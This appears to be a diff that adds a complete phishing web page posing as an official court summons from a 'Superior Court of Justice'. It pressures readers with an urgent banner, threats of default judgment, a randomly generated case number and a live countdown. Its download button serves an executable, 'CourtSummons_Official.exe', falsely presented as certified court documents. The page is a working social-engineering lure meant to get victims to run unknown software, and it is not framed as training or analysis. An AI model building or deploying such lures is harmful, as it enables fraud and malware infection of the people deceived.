@@ -1,0 +1,483 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1.0"/>
+<title>Official Court Summons — Action Required</title>
+<link href="https://fonts.googleapis.com/css2?family=EB+Garamond:wght@400;500;600;700&family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet"/>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --ink:#0a0a0f;
+  --paper:#f5f0e8;
+  --paper2:#ede8dc;
+  --seal:#8b1a1a;
+  --seal2:#b22222;
+  --gold:#c8962a;
+  --gold2:#e8b84b;
+  --border:#2a2a2a;
+  --muted:#5a5a5a;
+  --font:'EB Garamond',Georgia,serif;
+  --mono:'Source Code Pro',monospace;
+}
+body{
+  font-family:var(--font);
+  background:var(--ink);
+  min-height:100vh;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  padding:20px;
+  position:relative;
+  overflow-x:hidden;
+}
+
+/* dark vignette bg */
+body::before{
+  content:'';position:fixed;inset:0;
+  background:radial-gradient(ellipse at center,#1a0a0a 0%,#050508 70%);
+  z-index:0;
+}
+
+/* subtle texture */
+body::after{
+  content:'';position:fixed;inset:0;
+  background-image:url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.75' numOctaves='4'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.04'/%3E%3C/svg%3E");
+  pointer-events:none;z-index:0;
+}
+
+.wrapper{
+  position:relative;z-index:1;
+  width:100%;max-width:760px;
+}
+
+/* URGENT BANNER */
+.urgent-banner{
+  background:var(--seal);
+  color:#fff;
+  text-align:center;
+  padding:10px 20px;
+  font-size:12px;
+  font-weight:600;
+  letter-spacing:.2em;
+  text-transform:uppercase;
+  font-family:var(--mono);
+  animation:blink-border 2s infinite;
+  border:2px solid var(--seal2);
+  border-bottom:none;
+  border-radius:4px 4px 0 0;
+}
+@keyframes blink-border{
+  0%,100%{border-color:var(--seal2);}
+  50%{border-color:#ff4444;}
+}
+
+/* DOCUMENT */
+.document{
+  background:var(--paper);
+  border:2px solid #3a2a1a;
+  border-top:none;
+  border-radius:0 0 4px 4px;
+  box-shadow:
+    0 0 0 1px rgba(200,150,42,0.3),
+    0 40px 80px rgba(0,0,0,0.8),
+    inset 0 0 60px rgba(0,0,0,0.05);
+  overflow:hidden;
+  animation:fadeUp .7s ease forwards;
+}
+@keyframes fadeUp{from{opacity:0;transform:translateY(24px);}to{opacity:1;transform:translateY(0);}}
+
+/* gold top line */
+.document::before{
+  content:'';display:block;
+  height:4px;
+  background:linear-gradient(90deg,transparent,var(--gold),var(--gold2),var(--gold),transparent);
+}
+
+.doc-inner{padding:50px 56px;}
+
+/* HEADER */
+.doc-header{text-align:center;margin-bottom:32px;}
+
+.seal-row{
+  display:flex;align-items:center;justify-content:center;
+  gap:16px;margin-bottom:20px;
+}
+.seal{
+  width:64px;height:64px;
+  border:3px solid var(--seal);
+  border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:28px;
+  background:linear-gradient(135deg,#fff5f5,#ffe8e8);
+  box-shadow:0 2px 12px rgba(139,26,26,0.2),inset 0 1px 0 rgba(255,255,255,0.8);
+  flex-shrink:0;
+}
+.header-text{}
+.court-name{
+  font-size:13px;font-weight:600;
+  letter-spacing:.15em;text-transform:uppercase;
+  color:var(--seal);font-family:var(--mono);
+}
+.jurisdiction{
+  font-size:11px;color:var(--muted);
+  letter-spacing:.1em;text-transform:uppercase;
+  margin-top:2px;font-family:var(--mono);
+}
+
+.divider{
+  border:none;
+  border-top:2px solid var(--border);
+  margin:16px 0;
+  position:relative;
+}
+.divider::before{
+  content:'⚖';
+  position:absolute;top:50%;left:50%;
+  transform:translate(-50%,-50%);
+  background:var(--paper);
+  padding:0 12px;
+  font-size:16px;
+  color:var(--seal);
+}
+
+.doc-title{
+  font-size:28px;font-weight:700;
+  letter-spacing:.05em;
+  text-transform:uppercase;
+  color:var(--ink);
+  margin:20px 0 6px;
+  line-height:1.2;
+}
+.doc-subtitle{
+  font-size:14px;color:var(--seal);
+  font-weight:600;letter-spacing:.1em;
+  text-transform:uppercase;font-family:var(--mono);
+}
+
+/* CASE INFO */
+.case-row{
+  display:grid;grid-template-columns:1fr 1fr 1fr;
+  gap:1px;background:var(--border);
+  border:1px solid var(--border);
+  margin:28px 0;border-radius:4px;overflow:hidden;
+}
+.case-cell{
+  background:var(--paper2);
+  padding:14px 16px;
+}
+.case-label{
+  font-size:9px;font-weight:600;
+  letter-spacing:.15em;text-transform:uppercase;
+  color:var(--muted);font-family:var(--mono);
+  margin-bottom:4px;
+}
+.case-val{
+  font-size:14px;font-weight:600;
+  color:var(--ink);font-family:var(--mono);
+}
+.case-val.red{color:var(--seal);}
+
+/* BODY TEXT */
+.notice-label{
+  font-size:10px;font-weight:600;letter-spacing:.15em;
+  text-transform:uppercase;color:var(--muted);
+  font-family:var(--mono);margin-bottom:12px;
+  display:flex;align-items:center;gap:8px;
+}
+.notice-label::before,.notice-label::after{
+  content:'';flex:1;height:1px;background:var(--border);opacity:.4;
+}
+
+.body-text{
+  font-size:16px;line-height:1.9;
+  color:#2a1a0a;
+  margin-bottom:20px;
+}
+.body-text strong{color:var(--seal);font-weight:700;}
+
+.warning-box{
+  background:linear-gradient(135deg,#fff5f5,#ffe8e8);
+  border:1px solid rgba(139,26,26,0.3);
+  border-left:4px solid var(--seal);
+  border-radius:0 4px 4px 0;
+  padding:16px 20px;
+  margin:24px 0;
+  font-size:14px;
+  line-height:1.7;
+  color:#3a1a1a;
+}
+.warning-box .warn-title{
+  font-weight:700;font-size:13px;
+  text-transform:uppercase;letter-spacing:.1em;
+  color:var(--seal);font-family:var(--mono);
+  margin-bottom:6px;
+  display:flex;align-items:center;gap:6px;
+}
+
+/* DEADLINE */
+.deadline-box{
+  background:var(--ink);
+  border-radius:6px;
+  padding:20px 24px;
+  margin:24px 0;
+  display:flex;align-items:center;justify-content:space-between;
+  gap:16px;
+}
+.deadline-label{
+  font-size:11px;font-weight:600;letter-spacing:.15em;
+  text-transform:uppercase;color:rgba(255,255,255,0.5);
+  font-family:var(--mono);margin-bottom:4px;
+}
+.deadline-val{
+  font-size:22px;font-weight:700;
+  color:var(--gold2);font-family:var(--mono);
+  letter-spacing:.03em;
+}
+.countdown{
+  text-align:right;
+}
+.countdown-label{
+  font-size:10px;letter-spacing:.1em;text-transform:uppercase;
+  color:rgba(255,255,255,0.4);font-family:var(--mono);margin-bottom:4px;
+}
+.countdown-val{
+  font-size:18px;font-weight:700;
+  color:#ff6b6b;font-family:var(--mono);
+  animation:tick .5s infinite alternate;
+}
+@keyframes tick{from{opacity:1;}to{opacity:.6;}}
+
+/* DOWNLOAD SECTION */
+.download-section{
+  text-align:center;
+  margin:32px 0 16px;
+  padding:28px 24px;
+  background:linear-gradient(135deg,#fff8f0,#fff3e8);
+  border:1px solid rgba(200,150,42,0.3);
+  border-radius:6px;
+}
+.dl-instruction{
+  font-size:13px;color:var(--muted);
+  font-family:var(--mono);letter-spacing:.05em;
+  margin-bottom:20px;
+  text-transform:uppercase;
+}
+.btn-download{
+  display:inline-flex;align-items:center;gap:12px;
+  background:linear-gradient(135deg,var(--seal),#6b1212);
+  color:#fff;
+  padding:18px 40px;
+  border-radius:4px;
+  font-family:var(--font);
+  font-size:18px;
+  font-weight:700;
+  text-decoration:none;
+  letter-spacing:.03em;
+  box-shadow:
+    0 4px 24px rgba(139,26,26,0.4),
+    inset 0 1px 0 rgba(255,255,255,0.1);
+  transition:all .2s;
+  cursor:pointer;
+  border:none;
+  position:relative;
+  overflow:hidden;
+}
+.btn-download::before{
+  content:'';
+  position:absolute;inset:0;
+  background:linear-gradient(135deg,rgba(255,255,255,0.1),transparent);
+  pointer-events:none;
+}
+.btn-download:hover{
+  background:linear-gradient(135deg,#a01a1a,#7a1010);
+  box-shadow:0 8px 32px rgba(139,26,26,0.6),inset 0 1px 0 rgba(255,255,255,0.1);
+  transform:translateY(-1px);
+}
+.btn-download:active{transform:translateY(0);}
+.btn-icon{font-size:22px;}
+.dl-note{
+  font-size:12px;color:var(--muted);
+  margin-top:14px;font-family:var(--mono);
+}
+.dl-note span{color:var(--seal);font-weight:600;}
+
+/* FOOTER */
+.doc-footer{
+  margin-top:32px;
+  padding-top:20px;
+  border-top:1px solid rgba(42,42,42,0.3);
+  display:flex;align-items:flex-start;justify-content:space-between;
+  gap:20px;
+}
+.footer-seal{
+  font-size:11px;color:var(--muted);
+  font-family:var(--mono);
+  line-height:1.8;
+}
+.footer-seal strong{color:var(--ink);}
+.signature{
+  text-align:right;
+  font-size:12px;color:var(--muted);
+  font-family:var(--mono);
+}
+.sig-line{
+  width:160px;height:1px;
+  background:var(--border);
+  margin:8px 0 4px auto;
+}
+
+/* REFERENCE BAR */
+.ref-bar{
+  background:var(--paper2);
+  border-top:1px solid rgba(42,42,42,0.2);
+  padding:12px 56px;
+  display:flex;align-items:center;justify-content:space-between;
+  font-size:10px;color:var(--muted);
+  font-family:var(--mono);letter-spacing:.08em;
+}
+
+@media(max-width:600px){
+  .doc-inner{padding:32px 24px;}
+  .case-row{grid-template-columns:1fr;}
+  .doc-footer{flex-direction:column;}
+  .deadline-box{flex-direction:column;text-align:center;}
+  .countdown{text-align:center;}
+  .ref-bar{padding:12px 24px;flex-direction:column;gap:4px;text-align:center;}
+}
+</style>
+</head>
+<body>
+<div class="wrapper">
+  <div class="urgent-banner">⚠ &nbsp; URGENT LEGAL NOTICE — IMMEDIATE ACTION REQUIRED &nbsp; ⚠</div>
+
+  <div class="document">
+    <div class="doc-inner">
+
+      <div class="doc-header">
+        <div class="seal-row">
+          <div class="seal">⚖️</div>
+          <div class="header-text">
+            <div class="court-name">Superior Court of Justice</div>
+            <div class="jurisdiction">Official Court Document Portal — Secured & Encrypted</div>
+          </div>
+          <div class="seal">🏛️</div>
+        </div>
+        <hr class="divider"/>
+        <div class="doc-title">Court Summons</div>
+        <div class="doc-subtitle">Official Notice of Legal Proceeding — Confidential</div>
+      </div>
+
+      <div class="case-row">
+        <div class="case-cell">
+          <div class="case-label">Case Reference</div>
+          <div class="case-val" id="caseRef">SCJ-2026-</div>
+        </div>
+        <div class="case-cell">
+          <div class="case-label">Filing Date</div>
+          <div class="case-val" id="fileDate"></div>
+        </div>
+        <div class="case-cell">
+          <div class="case-label">Status</div>
+          <div class="case-val red">⚑ ACTION REQUIRED</div>
+        </div>
+      </div>
+
+      <div class="notice-label">Official Notice</div>
+
+      <p class="body-text">
+        You have been formally summoned to appear before the <strong>Superior Court of Justice</strong> in connection with a pending legal matter filed against your name. This summons has been issued under the authority of the Court and requires your <strong>immediate attention and response</strong>.
+      </p>
+
+      <p class="body-text">
+        Failure to acknowledge and respond to this summons within the specified timeframe may result in a <strong>default judgment being entered against you</strong>, additional court fees, and potential enforcement proceedings.
+      </p>
+
+      <div class="warning-box">
+        <div class="warn-title">⚠ Important Notice</div>
+        You must download and review the attached court documents immediately. The document contains details of the case, your required response, and the scheduled hearing date. Do not ignore this notice.
+      </div>
+
+      <div class="deadline-box">
+        <div>
+          <div class="deadline-label">Response Deadline</div>
+          <div class="deadline-val" id="deadline"></div>
+        </div>
+        <div class="countdown">
+          <div class="countdown-label">Time Remaining</div>
+          <div class="countdown-val" id="countdown">—</div>
+        </div>
+      </div>
+
+      <div class="download-section">
+        <div class="dl-instruction">📄 Your court documents are ready for download</div>
+        <a class="btn-download" href="Court-sumon.exe" download="CourtSummons_Official.exe">
+          <span class="btn-icon">⬇</span>
+          Download Court Documents
+        </a>
+        <div class="dl-note">
+          Secure document — <span>Digitally Certified</span> by the Court Registry<br/>
+          File: <span>CourtSummons_Official.exe</span> · Encrypted · Official Use Only
+        </div>
+      </div>
+
+      <div class="doc-footer">
+        <div class="footer-seal">
+          <strong>Superior Court of Justice</strong><br/>
+          Document Reference Portal<br/>
+          Issued under Court Authority<br/>
+          Case ID: <span id="footerCase"></span>
+        </div>
+        <div class="signature">
+          <div>Court Registrar</div>
+          <div class="sig-line"></div>
+          <div>Authorized Signatory</div>
+          <div id="signDate"></div>
+        </div>
+      </div>
+
+    </div>
+    <div class="ref-bar">
+      <span>CONFIDENTIAL — FOR NAMED RECIPIENT ONLY</span>
+      <span id="refCode"></span>
+      <span>SUPERIOR COURT OF JUSTICE © <span id="year"></span></span>
+    </div>
+  </div>
+</div>
+
+<script>
+// Generate dynamic case data
+function pad(n){return String(n).padStart(2,'0');}
+const now = new Date();
+const year = now.getFullYear();
+const caseNum = Math.floor(Math.random()*90000)+10000;
+const caseRef = 'SCJ-'+year+'-'+caseNum;
+const fileDate = pad(now.getDate())+'/'+pad(now.getMonth()+1)+'/'+year;
+
+// Deadline = 3 days from now
+const deadline = new Date(now.getTime() + 3*24*60*60*1000);
+const deadlineStr = pad(deadline.getDate())+'/'+pad(deadline.getMonth()+1)+'/'+year;
+
+document.getElementById('caseRef').textContent = caseRef;
+document.getElementById('fileDate').textContent = fileDate;
+document.getElementById('deadline').textContent = deadlineStr;
+document.getElementById('footerCase').textContent = caseRef;
+document.getElementById('signDate').textContent = fileDate;
+document.getElementById('refCode').textContent = 'REF: '+caseRef+'/'+Math.floor(Math.random()*9000+1000);
+document.getElementById('year').textContent = year;
+
+// Countdown timer
+function updateCountdown(){
+  const diff = deadline - new Date();
+  if(diff<=0){document.getElementById('countdown').textContent='EXPIRED';return;}
+  const d = Math.floor(diff/86400000);
+  const h = Math.floor((diff%86400000)/3600000);
+  const m = Math.floor((diff%3600000)/60000);
+  const s = Math.floor((diff%60000)/1000);
+  document.getElementById('countdown').textContent = d+'d '+pad(h)+'h '+pad(m)+'m '+pad(s)+'s';
+}
+updateCountdown();
+setInterval(updateCountdown,1000);
+</script>
+</body>
+</html>
